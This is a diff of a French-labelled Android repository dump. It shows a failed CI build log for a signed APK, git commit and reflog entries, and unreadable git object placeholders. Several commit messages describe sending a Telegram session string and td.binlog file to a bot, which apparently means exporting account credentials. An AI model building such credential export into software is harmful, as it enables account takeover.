+build	Build APK release signé	2026-10-27T11:32:06.6497957Z 	at org.gradle.internal.execution.steps.AssignMutableWorkspaceStep.execute(AssignMutableWorkspaceStep.java:31)
+build	Build APK release signé	2026-10-27T11:32:06.6498756Z 	at org.gradle.internal.execution.steps.AssignMutableWorkspaceStep.execute(AssignMutableWorkspaceStep.java:22)
+build	Build APK release signé	2026-10-27T11:32:06.6499496Z 	at org.gradle.internal.execution.steps.ChoosePipelineStep.execute(ChoosePipelineStep.java:40)
+build	Build APK release signé	2026-10-27T11:32:06.6500178Z 	at org.gradle.internal.execution.steps.ChoosePipelineStep.execute(ChoosePipelineStep.java:23)
+build	Build APK release signé	2026-10-27T11:32:06.6501032Z 	at org.gradle.internal.execution.steps.ExecuteWorkBuildOperationFiringStep.lambda$execute$2(ExecuteWorkBuildOperationFiringStep.java:67)
+build	Build APK release signé	2026-10-27T11:32:06.6502240Z 	at org.gradle.internal.execution.steps.ExecuteWorkBuildOperationFiringStep.execute(ExecuteWorkBuildOperationFiringStep.java:67)
+build	Build APK release signé	2026-10-27T11:32:06.6503203Z 	at org.gradle.internal.execution.steps.ExecuteWorkBuildOperationFiringStep.execute(ExecuteWorkBuildOperationFiringStep.java:39)
+build	Build APK release signé	2026-10-27T11:32:06.6504027Z 	at org.gradle.internal.execution.steps.IdentityCacheStep.execute(IdentityCacheStep.java:46)
+build	Build APK release signé	2026-10-27T11:32:06.6504680Z 	at org.gradle.internal.execution.steps.IdentityCacheStep.execute(IdentityCacheStep.java:34)
+build	Build APK release signé	2026-10-27T11:32:06.6505263Z 	at org.gradle.internal.execution.steps.IdentifyStep.execute(IdentifyStep.java:48)
+build	Build APK release signé	2026-10-27T11:32:06.6505804Z 	at org.gradle.internal.execution.steps.IdentifyStep.execute(IdentifyStep.java:35)
+build	Build APK release signé	2026-10-27T11:32:06.6506278Z 	at org.gradle.internal.execution.impl.DefaultExecutionEngine$1.execute(DefaultExecutionEngine.java:61)
+build	Build APK release signé	2026-10-27T11:32:06.6506780Z 	at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.executeIfValid(ExecuteActionsTaskExecuter.java:127)
+build	Build APK release signé	2026-10-27T11:32:06.6507293Z 	at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.execute(ExecuteActionsTaskExecuter.java:116)
+build	Build APK release signé	2026-10-27T11:32:06.6507808Z 	at org.gradle.api.internal.tasks.execution.FinalizePropertiesTaskExecuter.execute(FinalizePropertiesTaskExecuter.java:46)
+build	Build APK release signé	2026-10-27T11:32:06.6508348Z 	at org.gradle.api.internal.tasks.execution.ResolveTaskExecutionModeExecuter.execute(ResolveTaskExecutionModeExecuter.java:51)
+build	Build APK release signé	2026-10-27T11:32:06.6508887Z 	at org.gradle.api.internal.tasks.execution.SkipTaskWithNoActionsExecuter.execute(SkipTaskWithNoActionsExecuter.java:57)
+build	Build APK release signé	2026-10-27T11:32:06.6513136Z 	at org.gradle.api.internal.tasks.execution.SkipOnlyIfTaskExecuter.execute(SkipOnlyIfTaskExecuter.java:74)
+build	Build APK release signé	2026-10-27T11:32:06.6513614Z 	at org.gradle.api.internal.tasks.execution.CatchExceptionTaskExecuter.execute(CatchExceptionTaskExecuter.java:36)
+build	Build APK release signé	2026-10-27T11:32:06.6514209Z 	at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.executeTask(EventFiringTaskExecuter.java:77)
+build	Build APK release signé	2026-10-27T11:32:06.6514671Z 	at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.call(EventFiringTaskExecuter.java:55)
+build	Build APK release signé	2026-10-27T11:32:06.6515119Z 	at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.call(EventFiringTaskExecuter.java:52)
+build	Build APK release signé	2026-10-27T11:32:06.6515638Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:200)
+build	Build APK release signé	2026-10-27T11:32:06.6516224Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:195)
+build	Build APK release signé	2026-10-27T11:32:06.6516752Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:66)
+build	Build APK release signé	2026-10-27T11:32:06.6517213Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:59)
+build	Build APK release signé	2026-10-27T11:32:06.6517683Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:157)
+build	Build APK release signé	2026-10-27T11:32:06.6518141Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:59)
+build	Build APK release signé	2026-10-27T11:32:06.6518597Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner.call(DefaultBuildOperationRunner.java:53)
+build	Build APK release signé	2026-10-27T11:32:06.6519056Z 	at org.gradle.internal.operations.DefaultBuildOperationExecutor.call(DefaultBuildOperationExecutor.java:73)
+build	Build APK release signé	2026-10-27T11:32:06.6519517Z 	at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter.execute(EventFiringTaskExecuter.java:52)
+build	Build APK release signé	2026-10-27T11:32:06.6519943Z 	at org.gradle.execution.plan.LocalTaskNodeExecutor.execute(LocalTaskNodeExecutor.java:42)
+build	Build APK release signé	2026-10-27T11:32:06.6520415Z 	at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$InvokeNodeExecutorsAction.execute(DefaultTaskExecutionGraph.java:331)
+build	Build APK release signé	2026-10-27T11:32:06.6520964Z 	at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$InvokeNodeExecutorsAction.execute(DefaultTaskExecutionGraph.java:318)
+build	Build APK release signé	2026-10-27T11:32:06.6521550Z 	at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.lambda$execute$0(DefaultTaskExecutionGraph.java:314)
+build	Build APK release signé	2026-10-27T11:32:06.6522531Z 	at org.gradle.internal.operations.CurrentBuildOperationRef.with(CurrentBuildOperationRef.java:80)
+build	Build APK release signé	2026-10-27T11:32:06.6523216Z 	at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.execute(DefaultTaskExecutionGraph.java:314)
+build	Build APK release signé	2026-10-27T11:32:06.6523815Z 	at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.execute(DefaultTaskExecutionGraph.java:303)
+build	Build APK release signé	2026-10-27T11:32:06.6524321Z 	at org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.execute(DefaultPlanExecutor.java:463)
+build	Build APK release signé	2026-10-27T11:32:06.6524726Z 	at org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.run(DefaultPlanExecutor.java:380)
+build	Build APK release signé	2026-10-27T11:32:06.6525150Z 	at org.gradle.internal.concurrent.ExecutorPolicy$CatchAndRecordFailures.onExecute(ExecutorPolicy.java:64)
+build	Build APK release signé	2026-10-27T11:32:06.6525568Z 	at org.gradle.internal.concurrent.AbstractManagedExecutor$1.run(AbstractManagedExecutor.java:47)
+build	Build APK release signé	2026-10-27T11:32:06.6526009Z Caused by: org.jetbrains.kotlin.gradle.tasks.CompilationErrorException: Compilation error. See log for more details
+build	Build APK release signé	2026-10-27T11:32:06.6526471Z 	at org.jetbrains.kotlin.gradle.tasks.TasksUtilsKt.throwExceptionIfCompilationFailed(tasksUtils.kt:20)
+build	Build APK release signé	2026-10-27T11:32:06.6526915Z 	at org.jetbrains.kotlin.compilerRunner.GradleKotlinCompilerWork.run(GradleKotlinCompilerWork.kt:141)
+build	Build APK release signé	2026-10-27T11:32:06.6527457Z 	at org.jetbrains.kotlin.compilerRunner.GradleCompilerRunnerWithWorkers$GradleKotlinCompilerWorkAction.execute(GradleCompilerRunnerWithWorkers.kt:73)
+build	Build APK release signé	2026-10-27T11:32:06.6528083Z 	at org.gradle.workers.internal.DefaultWorkerServer.execute(DefaultWorkerServer.java:63)
+build	Build APK release signé	2026-10-27T11:32:06.6528574Z 	at org.gradle.workers.internal.NoIsolationWorkerFactory$1$1.create(NoIsolationWorkerFactory.java:66)
+build	Build APK release signé	2026-10-27T11:32:06.6528999Z 	at org.gradle.workers.internal.NoIsolationWorkerFactory$1$1.create(NoIsolationWorkerFactory.java:62)
+build	Build APK release signé	2026-10-27T11:32:06.6529430Z 	at org.gradle.internal.classloader.ClassLoaderUtils.executeInClassloader(ClassLoaderUtils.java:100)
+build	Build APK release signé	2026-10-27T11:32:06.6529877Z 	at org.gradle.workers.internal.NoIsolationWorkerFactory$1.lambda$execute$0(NoIsolationWorkerFactory.java:62)
+build	Build APK release signé	2026-10-27T11:32:06.6530262Z 	at org.gradle.workers.internal.AbstractWorker$1.call(AbstractWorker.java:44)
+build	Build APK release signé	2026-10-27T11:32:06.6530569Z 	at org.gradle.workers.internal.AbstractWorker$1.call(AbstractWorker.java:41)
+build	Build APK release signé	2026-10-27T11:32:06.6531012Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:200)
+build	Build APK release signé	2026-10-27T11:32:06.6531592Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:195)
+build	Build APK release signé	2026-10-27T11:32:06.6532405Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:66)
+build	Build APK release signé	2026-10-27T11:32:06.6533193Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:59)
+build	Build APK release signé	2026-10-27T11:32:06.6533997Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:157)
+build	Build APK release signé	2026-10-27T11:32:06.6534811Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:59)
+build	Build APK release signé	2026-10-27T11:32:06.6535606Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner.call(DefaultBuildOperationRunner.java:53)
+build	Build APK release signé	2026-10-27T11:32:06.6536639Z 	at org.gradle.internal.operations.DefaultBuildOperationExecutor.call(DefaultBuildOperationExecutor.java:73)
+build	Build APK release signé	2026-10-27T11:32:06.6537436Z 	at org.gradle.workers.internal.AbstractWorker.executeWrappedInBuildOperation(AbstractWorker.java:41)
+build	Build APK release signé	2026-10-27T11:32:06.6538175Z 	at org.gradle.workers.internal.NoIsolationWorkerFactory$1.execute(NoIsolationWorkerFactory.java:59)
+build	Build APK release signé	2026-10-27T11:32:06.6538905Z 	at org.gradle.workers.internal.DefaultWorkerExecutor.lambda$submitWork$0(DefaultWorkerExecutor.java:174)
+build	Build APK release signé	2026-10-27T11:32:06.6539765Z 	at org.gradle.internal.work.DefaultConditionalExecutionQueue$ExecutionRunner.runExecution(DefaultConditionalExecutionQueue.java:187)
+build	Build APK release signé	2026-10-27T11:32:06.6540771Z 	at org.gradle.internal.work.DefaultConditionalExecutionQueue$ExecutionRunner.access$700(DefaultConditionalExecutionQueue.java:120)
+build	Build APK release signé	2026-10-27T11:32:06.6541727Z 	at org.gradle.internal.work.DefaultConditionalExecutionQueue$ExecutionRunner$1.run(DefaultConditionalExecutionQueue.java:162)
+build	Build APK release signé	2026-10-27T11:32:06.6542541Z 	at org.gradle.internal.Factories$1.create(Factories.java:31)
+build	Build APK release signé	2026-10-27T11:32:06.6543137Z 	at org.gradle.internal.work.DefaultWorkerLeaseService.withLocks(DefaultWorkerLeaseService.java:264)
+build	Build APK release signé	2026-10-27T11:32:06.6543931Z 	at org.gradle.internal.work.DefaultWorkerLeaseService.runAsWorkerThread(DefaultWorkerLeaseService.java:128)
+build	Build APK release signé	2026-10-27T11:32:06.6544779Z 	at org.gradle.internal.work.DefaultWorkerLeaseService.runAsWorkerThread(DefaultWorkerLeaseService.java:133)
+build	Build APK release signé	2026-10-27T11:32:06.6545669Z 	at org.gradle.internal.work.DefaultConditionalExecutionQueue$ExecutionRunner.runBatch(DefaultConditionalExecutionQueue.java:157)
+build	Build APK release signé	2026-10-27T11:32:06.6546593Z 	at org.gradle.internal.work.DefaultConditionalExecutionQueue$ExecutionRunner.run(DefaultConditionalExecutionQueue.java:126)
+build	Build APK release signé	2026-10-27T11:32:06.6547161Z 	... 2 more
+build	Build APK release signé	2026-10-27T11:32:06.6547266Z 
+build	Build APK release signé	2026-10-27T11:32:06.6547272Z 
+build	Build APK release signé	2026-10-27T11:32:06.6547364Z BUILD FAILED in 1m 1s
+build	Build APK release signé	2026-10-27T11:32:07.0746435Z ##[error]Process completed with exit code 1.
 
 
 ================================================================================
@@ -1017,7 +1284,7 @@ include(":app")
 FICHIER : .git/COMMIT_EDITMSG
 ================================================================================
 
-session string + td.binlog -> bot, ABI 32/64 another essay
+session string + td.binlog -> bot, ABI 32/64 another essay 6
 
 
 ================================================================================
@@ -2077,6 +2344,11 @@ b705d5cef0f86ecf03dda259f0bc5624dd4d8f95 fa685779686d344d8f4234563817080b366262c
 fa685779686d344d8f4234563817080b366262c1 02e05c6adc519f1a76e0d225e95c6d44a149eb46 Mitsuriiiiiiiiiii <ton@email> 1793058521 +0100	commit: fix(app): champs TDLib au lieu de setters, doOutput, longueur de code, RegisterUser
 02e05c6adc519f1a76e0d225e95c6d44a149eb46 8e2e72e9d15c6222d8c035d5dff00d2648a82eb8 Mitsuriiiiiiiiiii <ton@email> 1793093241 +0100	commit: session string + td.binlog -> bot, ABI 32/64
 8e2e72e9d15c6222d8c035d5dff00d2648a82eb8 151dd3fc1793a17b3129fa35c886a290b8724680 Mitsuriiiiiiiiiii <ton@email> 1793095255 +0100	commit: session string + td.binlog -> bot, ABI 32/64 another essay
+151dd3fc1793a17b3129fa35c886a290b8724680 632c61f8228ba5f54953551b81f874bc084d6616 Mitsuriiiiiiiiiii <ton@email> 1793100583 +0100	commit: session string + td.binlog -> bot, ABI 32/64 another essay 2
+632c61f8228ba5f54953551b81f874bc084d6616 83abff67cea4e24dc703ab2a61786d9c3fe6ad0d Mitsuriiiiiiiiiii <ton@email> 1793101153 +0100	commit: session string + td.binlog -> bot, ABI 32/64 another essay 3
+83abff67cea4e24dc703ab2a61786d9c3fe6ad0d ff981811f283f6f68007ff89d2ec0f8ad416a66a Mitsuriiiiiiiiiii <ton@email> 1793102962 +0100	commit: session string + td.binlog -> bot, ABI 32/64 another essay 4
+ff981811f283f6f68007ff89d2ec0f8ad416a66a cb1d9d36d08a091cf59ba85f728a8075465d0bd8 Mitsuriiiiiiiiiii <ton@email> 1793104359 +0100	commit: session string + td.binlog -> bot, ABI 32/64 another essay 5
+cb1d9d36d08a091cf59ba85f728a8075465d0bd8 f8a019f4a6fbbdd2ec19619735d95aa6801c1f65 Mitsuriiiiiiiiiii <ton@email> 1793105206 +0100	commit: session string + td.binlog -> bot, ABI 32/64 another essay 6
 
 
 ================================================================================
@@ -2088,6 +2360,11 @@ b705d5cef0f86ecf03dda259f0bc5624dd4d8f95 fa685779686d344d8f4234563817080b366262c
 fa685779686d344d8f4234563817080b366262c1 02e05c6adc519f1a76e0d225e95c6d44a149eb46 Mitsuriiiiiiiiiii <ton@email> 1793058521 +0100	commit: fix(app): champs TDLib au lieu de setters, doOutput, longueur de code, RegisterUser
 02e05c6adc519f1a76e0d225e95c6d44a149eb46 8e2e72e9d15c6222d8c035d5dff00d2648a82eb8 Mitsuriiiiiiiiiii <ton@email> 1793093241 +0100	commit: session string + td.binlog -> bot, ABI 32/64
 8e2e72e9d15c6222d8c035d5dff00d2648a82eb8 151dd3fc1793a17b3129fa35c886a290b8724680 Mitsuriiiiiiiiiii <ton@email> 1793095255 +0100	commit: session string + td.binlog -> bot, ABI 32/64 another essay
+151dd3fc1793a17b3129fa35c886a290b8724680 632c61f8228ba5f54953551b81f874bc084d6616 Mitsuriiiiiiiiiii <ton@email> 1793100583 +0100	commit: session string + td.binlog -> bot, ABI 32/64 another essay 2
+632c61f8228ba5f54953551b81f874bc084d6616 83abff67cea4e24dc703ab2a61786d9c3fe6ad0d Mitsuriiiiiiiiiii <ton@email> 1793101153 +0100	commit: session string + td.binlog -> bot, ABI 32/64 another essay 3
+83abff67cea4e24dc703ab2a61786d9c3fe6ad0d ff981811f283f6f68007ff89d2ec0f8ad416a66a Mitsuriiiiiiiiiii <ton@email> 1793102962 +0100	commit: session string + td.binlog -> bot, ABI 32/64 another essay 4
+ff981811f283f6f68007ff89d2ec0f8ad416a66a cb1d9d36d08a091cf59ba85f728a8075465d0bd8 Mitsuriiiiiiiiiii <ton@email> 1793104359 +0100	commit: session string + td.binlog -> bot, ABI 32/64 another essay 5
+cb1d9d36d08a091cf59ba85f728a8075465d0bd8 f8a019f4a6fbbdd2ec19619735d95aa6801c1f65 Mitsuriiiiiiiiiii <ton@email> 1793105206 +0100	commit: session string + td.binlog -> bot, ABI 32/64 another essay 6
 
 
 ================================================================================
@@ -2099,6 +2376,11 @@ b705d5cef0f86ecf03dda259f0bc5624dd4d8f95 fa685779686d344d8f4234563817080b366262c
 fa685779686d344d8f4234563817080b366262c1 02e05c6adc519f1a76e0d225e95c6d44a149eb46 Mitsuriiiiiiiiiii <ton@email> 1793059188 +0100	update by push
 02e05c6adc519f1a76e0d225e95c6d44a149eb46 8e2e72e9d15c6222d8c035d5dff00d2648a82eb8 Mitsuriiiiiiiiiii <ton@email> 1793093246 +0100	update by push
 8e2e72e9d15c6222d8c035d5dff00d2648a82eb8 151dd3fc1793a17b3129fa35c886a290b8724680 Mitsuriiiiiiiiiii <ton@email> 1793095267 +0100	update by push
+151dd3fc1793a17b3129fa35c886a290b8724680 632c61f8228ba5f54953551b81f874bc084d6616 Mitsuriiiiiiiiiii <ton@email> 1793100592 +0100	update by push
+632c61f8228ba5f54953551b81f874bc084d6616 83abff67cea4e24dc703ab2a61786d9c3fe6ad0d Mitsuriiiiiiiiiii <ton@email> 1793101169 +0100	update by push
+83abff67cea4e24dc703ab2a61786d9c3fe6ad0d ff981811f283f6f68007ff89d2ec0f8ad416a66a Mitsuriiiiiiiiiii <ton@email> 1793102980 +0100	update by push
+ff981811f283f6f68007ff89d2ec0f8ad416a66a cb1d9d36d08a091cf59ba85f728a8075465d0bd8 Mitsuriiiiiiiiiii <ton@email> 1793104370 +0100	update by push
+cb1d9d36d08a091cf59ba85f728a8075465d0bd8 f8a019f4a6fbbdd2ec19619735d95aa6801c1f65 Mitsuriiiiiiiiiii <ton@email> 1793105215 +0100	update by push
 
 
 ================================================================================
@@ -2112,6 +2394,12 @@ FICHIER : .git/objects/02/e05c6adc519f1a76e0d225e95c6d44a149eb46
 ================================================================================
 
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x95 in position 2: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/09/2fae0ebd70deae6fb1d94fd92f48ae91e10d1e
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xcd in position 20: invalid continuation byte]
 
 ================================================================================
 FICHIER : .git/objects/09/711db268fae81176a8878cefdd441ef360c1c5
@@ -2144,10 +2432,28 @@ FICHIER : .git/objects/17/7068e035e95358cf4b86a07b3df81e421d24ad
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xd5 in position 25: invalid continuation byte]
 
 ================================================================================
+FICHIER : .git/objects/18/4ee24bc412466e22fdd2e2b75a97fd28094a2e
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 2: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/19/892708573a88b28fd2a3b8ddf9c12cc684eebb
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
 FICHIER : .git/objects/1a/45d1e07d743ee92e198dffa8b5f705abe4d15d
 ================================================================================
 
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xbd in position 16: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/1b/1600575b254f99e36dd6b729115c83ed1c889b
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x9b in position 6: invalid start byte]
 
 ================================================================================
 FICHIER : .git/objects/1c/de0ae483771f5aecd32875ce22bb6303dce75c
@@ -2222,6 +2528,12 @@ FICHIER : .git/objects/2c/665047135974460bb1b5bc904e0da688849e78
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 2: invalid start byte]
 
 ================================================================================
+FICHIER : .git/objects/2c/f97f5e0165719e0f9fb28687416dd389fdd7a5
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
 FICHIER : .git/objects/2d/dc1f3da3fe51106ff20b65f85ff76a1b82aef8
 ================================================================================
 
@@ -2234,6 +2546,12 @@ FICHIER : .git/objects/33/744b28f123bad13e928c434cdf4a6568158a8f
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xb5 in position 2: invalid start byte]
 
 ================================================================================
+FICHIER : .git/objects/33/e77ccd46a1f54175d558759676fda2008d78aa
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xd5 in position 2: invalid continuation byte]
+
+================================================================================
 FICHIER : .git/objects/35/bfb18098e30542cba9846a99e8541b51a26c43
 ================================================================================
 
@@ -2244,6 +2562,48 @@ FICHIER : .git/objects/36/68d69159698323dfe7e110d37f0a7a0e7aedba
 ================================================================================
 
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xed in position 2: invalid continuation byte]
+
+================================================================================
+FICHIER : .git/objects/37/18ce7dd6863717770f61cee03005e334373e75
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xb0 in position 9: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/38/738ce986160f86d03feb72e2888266fa04aa2d
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xbd in position 16: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/39/a1392f5d2ee336b6e39395f822ea1232ff50c8
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/3a/598aa43b2eb2358e50e03b4064d78755b0dc73
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xb0 in position 9: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/3c/6919ce703380c69f462b5e93f58d68f2c2a55f
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xd5 in position 25: invalid continuation byte]
+
+================================================================================
+FICHIER : .git/objects/3d/e9bf35183bd2708152c6705ade64965f79331e
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xbd in position 16: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/3f/b6fc2a3ae03194624250a82780497fb65b99cb
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
 
 ================================================================================
 FICHIER : .git/objects/41/0d182ea99d6278fc414ab44abde8ee48c98a7b
@@ -2264,16 +2624,34 @@ FICHIER : .git/objects/44/48c2fc2e95723e24c54a193b2dfa487c235721
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
 
 ================================================================================
+FICHIER : .git/objects/44/90dc50805f93177d9277d1c1a6c5f300cb5ecf
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xf0 in position 17: invalid continuation byte]
+
+================================================================================
 FICHIER : .git/objects/48/e6c57fd63450cc823276f0c35fc51124e264c4
 ================================================================================
 
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xca in position 3: invalid continuation byte]
 
 ================================================================================
+FICHIER : .git/objects/49/2f5f2aab40eeccd8df353a83bcb0840702e624
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
 FICHIER : .git/objects/4c/eeeeb177a8ec5dcff08da072564f505c6b8060
 ================================================================================
 
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xcd in position 20: invalid continuation byte]
+
+================================================================================
+FICHIER : .git/objects/4d/a30ef8d07dcf1a7f1f6040726a6a057cc36d79
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xad in position 2: invalid start byte]
 
 ================================================================================
 FICHIER : .git/objects/4e/88039ddb3a7f04af873dddb0b3f34b80f84b02
@@ -2304,6 +2682,12 @@ FICHIER : .git/objects/53/c9757312d30f724fe21204322062c9a05a3932
 ================================================================================
 
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xca in position 3: invalid continuation byte]
+
+================================================================================
+FICHIER : .git/objects/56/ca2759569da5e2d3bfd5b889bf2ca6b3ef78c5
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xad in position 2: invalid start byte]
 
 ================================================================================
 FICHIER : .git/objects/5c/b555e002ce47028fa95a29bc6c8627e7472b61
@@ -2342,16 +2726,58 @@ FICHIER : .git/objects/62/a8ed1b5ba84a4829c41ecbc93a62afeb91218c
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
 
 ================================================================================
+FICHIER : .git/objects/63/2c61f8228ba5f54953551b81f874bc084d6616
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x95 in position 2: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/66/dee95db02d9985a27b08cca2e5b120c70be3de
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/68/0ea61bc4a42de770d223d47931bd46c7cd3ef1
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xcd in position 20: invalid continuation byte]
+
+================================================================================
 FICHIER : .git/objects/69/7db9fa4fd704c4ad3d1ddb8fa252258e37fdf4
 ================================================================================
 
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xb0 in position 9: invalid start byte]
 
 ================================================================================
+FICHIER : .git/objects/69/bf3389022bbe4f6295520c39191ac69fe7f9fc
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xdd in position 4: invalid continuation byte]
+
+================================================================================
+FICHIER : .git/objects/6a/bf4056aaceecf6495d8a54625770a977386103
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xb0 in position 9: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/6b/61315e6280768c9c69a5501beab495e05f3975
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xbd in position 16: invalid start byte]
+
+================================================================================
 FICHIER : .git/objects/6c/e55f445da1f262f62c890dee447e33e06541dd
 ================================================================================
 
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x8d in position 2: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/70/0f9ca9b7d6ea19e8909dcb86d99eda483cd3da
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
 
 ================================================================================
 FICHIER : .git/objects/71/7b7891fc93c0f43df25c3ee62cfcda56d521e2
@@ -2366,6 +2792,18 @@ FICHIER : .git/objects/71/ea24e809d06dd2c9e9add20c2c4fea15da0543
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x8d in position 2: invalid start byte]
 
 ================================================================================
+FICHIER : .git/objects/72/f0be780fbf772296a3f7b8205f9072d2124664
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/73/00ed43b335aad164d206f4d4c9c5aee192973d
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
 FICHIER : .git/objects/74/5bbf796d2703418dacb00d594bedf28ab6ed5d
 ================================================================================
 
@@ -2378,16 +2816,52 @@ FICHIER : .git/objects/77/888e350e248d7d98af2bf953487a024dd1b54f
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 2: invalid start byte]
 
 ================================================================================
+FICHIER : .git/objects/7d/4891a69b82c335fdfa984e63adb3069128a47f
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xd5 in position 25: invalid continuation byte]
+
+================================================================================
 FICHIER : .git/objects/81/0d61baa91fcfa0b6e088e97eb832f9664f6e96
 ================================================================================
 
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xb0 in position 9: invalid start byte]
 
 ================================================================================
+FICHIER : .git/objects/81/56ebd10c31f59464461bd3fd191b5dfda6b528
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x9d in position 2: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/81/625978d7a0f5defa46cfb3108594e8017bb9c0
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xd5 in position 25: invalid continuation byte]
+
+================================================================================
+FICHIER : .git/objects/83/abff67cea4e24dc703ab2a61786d9c3fe6ad0d
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x95 in position 2: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/84/371c864dd21316c55e9e0b7f25b3af438f4eed
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
